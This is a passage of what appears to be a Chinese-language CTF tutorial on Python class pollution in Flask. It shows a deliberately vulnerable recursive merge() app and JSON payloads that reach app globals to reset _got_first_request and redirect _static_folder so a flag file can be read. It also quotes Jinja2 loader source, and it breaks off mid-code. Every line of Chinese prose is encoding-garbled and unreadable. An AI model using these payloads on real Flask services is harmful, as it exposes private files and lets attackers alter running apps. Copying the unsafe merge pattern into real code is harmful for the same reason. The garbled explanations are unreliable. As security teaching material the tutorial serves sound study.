</div><p><code>before_first_request</code>ä¿®é¥°çš„<code>init</code>å‡½æ•°åªä¼šåœ¨ç¬¬ä¸€æ¬¡è®¿é—®å‰è¢«è°ƒç”¨ï¼Œè€Œå…¶ä¸­è¯»å–<code>flag</code>çš„é€»è¾‘åˆéœ€è¦è®¿é—®è·¯ç”±<code>/</code>åæ‰èƒ½è§¦å‘ï¼Œè¿™å°±æ„æˆäº†çŸ›ç›¾ã€‚æ‰€ä»¥éœ€è¦ä½¿ç”¨<code>payload</code>åœ¨è®¿é—®<code>/</code>åé‡ç½®<code>_got_first_request</code>å±æ€§å€¼ä¸ºå‡ï¼Œè¿™æ ·<code>before_first_request</code>æ‰ä¼šå†æ¬¡è°ƒç”¨ã€‚</p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__globals__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;app&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;_got_first_request&#34;</span> <span class="p">:</span><span class="n">false</span> 
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="_static_url_path">_static_url_path
</h5><p>è¿™ä¸ªå±æ€§ä¸­å­˜æ”¾çš„æ˜¯<code>flask</code>ä¸­é™æ€ç›®å½•çš„å€¼ï¼Œé»˜è®¤è¯¥å€¼ä¸º<code>static</code>ã€‚è®¿é—®<code>flask</code>ä¸‹çš„èµ„æºå¯ä»¥é‡‡ç”¨å¦‚<code>http://domain/static/xxx</code>ï¼Œè¿™æ ·å®é™…ä¸Šå°±ç›¸å½“äºè®¿é—®<code>_static_url_path</code>ç›®å½•ä¸‹<code>xxx</code>çš„æ–‡ä»¶å¹¶å°†è¯¥æ–‡ä»¶å†…å®¹ä½œä¸ºå“åº”å†…å®¹è¿”å›,ä½†æ˜¯å¦‚æœæˆ‘ä»¬æƒ³è¦è®¿é—®å…¶ä»–æ–‡ä»¶ä¸‹é¢çš„æ•æ„Ÿä¿¡æ¯ï¼Œæˆ‘ä»¬å°±éœ€è¦æ±¡æŸ“è¿™ä¸ªé™æ€ç›®å½•ï¼Œè®©ä»–è‡ªåŠ¨å¸®æˆ‘ä»¬å®ç°å®šå‘</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">#static/index.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>hello<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>    
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#app.py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">request</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cls</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">merge</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">),</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;flag in ./flag but heres only static/index.html&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ­¤æ—¶<code>http://domain/static/xxx</code>åªèƒ½è®¿é—®åˆ°æ–‡ä»¶ç³»ç»Ÿå½“å‰ç›®å½•ä¸‹<code>static</code>ç›®å½•ä¸­çš„<code>xxx</code>æ–‡ä»¶ï¼Œå¹¶ä¸”ä¸å­˜åœ¨å¦‚ç›®å½•ç©¿è¶Šçš„æ¼æ´,æ±¡æŸ“è¯¥å±æ€§ä¸ºå½“å‰ç›®å½•ã€‚è¿™æ ·å°±èƒ½è®¿é—®åˆ°å½“å‰ç›®å½•ä¸‹çš„<code>flag</code>æ–‡ä»¶äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__globals__&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;app&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;_static_folder&#34;</span><span class="p">:</span><span class="s2">&#34;./&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åå†è®¿é—®staticç›®å½•ä¸‹æ–‡ä»¶å°±è¡Œäº†</p>
<h5 id="ospathpardir">os.path.pardir
</h5><p>è¿™ä¸ª<code>os</code>æ¨¡å—ä¸‹çš„å˜é‡ä¼šå½±å“<code>flask</code>çš„æ¨¡æ¿æ¸²æŸ“å‡½æ•°<code>render_template</code>çš„è§£æï¼Œæ‰€ä»¥ä¹Ÿæ”¶å½•åœ¨<code>flask</code>éƒ¨åˆ†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">#templates/index.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>hello<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>    
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#app.py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">request</span><span class="p">,</span><span class="n">render_template</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cls</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">merge</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">),</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;flag in ./flag but u just can use /file to vist ./templates/file&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&lt;path:path&gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">render_page</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s2">&#34;templates/&#34;</span> <span class="o">+</span> <span class="n">path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;not found&#34;</span><span class="p">,</span> <span class="mi">404</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç›´æ¥è®¿é—®<code>http://domain/xxx</code>æ—¶ä¼šä½¿ç”¨<code>render_tempaltes</code>æ¸²æŸ“<code>templates/xxx</code>æ–‡ä»¶</p>
<p>å¦‚æœå°è¯•ç›®å½•ç©¿è¶Šåˆ™ä¼šå¯¼è‡´<code>render_template</code>å‡½æ•°æŠ¥é”™500</p>
<p>æ‰¾åˆ°æŠ¥é”™çš„æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_get_source_fast</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="p">,</span> <span class="n">environment</span><span class="p">:</span> <span class="n">BaseEnvironment</span><span class="p">,</span> <span class="n">template</span><span class="p">:</span> <span class="nb">str</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">tuple</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nb">str</span> <span class="o">|</span> <span class="kc">None</span><span class="p">,</span> <span class="n">t</span><span class="o">.</span><span class="n">Callable</span><span class="p">[[],</span> <span class="nb">bool</span><span class="p">]</span> <span class="o">|</span> <span class="kc">None</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">_srcobj</span><span class="p">,</span> <span class="n">loader</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">_iter_loaders</span><span class="p">(</span><span class="n">template</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">loader</span><span class="o">.</span><span class="n">get_source</span><span class="p">(</span><span class="n">environment</span><span class="p">,</span> <span class="n">template</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="n">TemplateNotFound</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="n">TemplateNotFound</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è·Ÿè¿›get_sourceå‡½æ•°ï¼Œæ¥åˆ°<code>Lib/site-packages/jinja2/loaders.py</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_source</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="p">,</span> <span class="n">environment</span><span class="p">:</span> <span class="s2">&#34;Environment&#34;</span><span class="p">,</span> <span class="n">template</span><span class="p">:</span> <span class="nb">str</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="o">-&gt;</span> <span class="n">t</span><span class="o">.</span><span class="n">Tuple</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nb">str</span><span class="p">,</span> <span class="n">t</span><span class="o">.</span><span class="n">Callable</span><span class="p">[[],</span> <span class="nb">bool</span><span class="p">]]:</span>
</span></span><span class="line"><span class="cl">        <span class="n">pieces</span> <span class="o">=</span> <span class="n">split_template_path</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">searchpath</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">searchpath</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># Use posixpath even on Windows to avoid &#34;drive:&#34; or UNC</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># segments breaking out of the search directory.</span>
</span></span><span class="line"><span class="cl">            <span class="n">filename</span> <span class="o">=</span> <span class="n">posixpath</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">searchpath</span><span class="p">,</span> <span class="o">*</span><span class="n">pieces</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="n">TemplateNotFound</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">encoding</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">contents</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">mtime</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">getmtime</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">def</span> <span class="nf">uptodate</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">getmtime</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span> <span class="o">==</span> <span class="n">mtime</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">OSError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Use normpath to convert Windows altsep to sep.</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">contents</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">normpath</span><span class="p">(</span><span class="n">filename</span><span class="p">),</span> <span class="n">uptodate</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è·Ÿè¿›split_template_pathå‡½æ•°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">split_template_path</span><span class="p">(</span><span class="n">template</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">t</span><span class="o">.</span><span class="n">List</span><span class="p">[</span><span class="nb">str</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Split a path into segments and perform a sanity check.  If it detects
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#39;..&#39; in the path it will raise a `TemplateNotFound` error.
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">pieces</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">piece</span> <span class="ow">in</span> <span class="n">template</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">sep</span> <span class="ow">in</span> <span class="n">piece</span>
